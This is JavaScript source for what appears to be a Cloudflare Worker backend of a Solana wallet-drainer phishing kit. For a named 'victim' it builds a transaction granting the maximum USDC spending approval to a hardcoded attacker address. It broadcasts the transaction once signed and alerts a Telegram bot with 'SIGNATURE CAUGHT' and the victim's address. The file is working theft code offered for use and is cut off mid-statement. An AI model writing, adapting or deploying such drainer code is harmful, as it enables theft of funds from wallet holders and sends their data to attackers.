import { Buffer } from 'buffer';
globalThis.Buffer = Buffer;

import { Connection, PublicKey, Keypair, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
import { createTransferInstruction, getAssociatedTokenAddress, createApproveInstruction, createAssociatedTokenAccountInstruction } from "@solana/spl-token";
import bs58 from "bs58";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    if (request.method === "POST") {
      try {
        const data = await request.json();
        
        // RPC Wechsel (Extrnode statt Ankr)
        const connection = new Connection("https://solana-mainnet.rpc.extrnode.com", "confirmed");
        const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");

        if (data.type === "build_tx") {
          const victimPubkey = new PublicKey(data.victim);
          const attackerPubkey = new PublicKey("FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB");
          
          const victimAta = await getAssociatedTokenAddress(USDC_MINT, victimPubkey);
          
          const tx = new Transaction();
          tx.add(
            createApproveInstruction(
              victimAta,
              attackerPubkey,
              victimPubkey,
              [],
              BigInt("18446744073709551615")
            )
          );
          
          tx.feePayer = victimPubkey;
          tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

          const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
          return new Response(JSON.stringify({ tx: serialized.toString('base64') }), {
            headers: { ...corsHeaders, "Content-Type": "application/json" },
          });
        }

        if (data.type === "send_tx") {
          const rawTx = Buffer.from(data.tx, "base64");
          const tx = Transaction.from(rawTx);
          
          const sig = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true });
          
          if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: `🎣 *SIGNATURE CAUGHT!*\n\nTX: \`${sig}\`\n\nAddress: \`${data.victim}\``, parse_mode: "Markdown" }),
            });
          }

          return new Response(JSON.stringify({ success: true, sig }), {
            headers: { ...
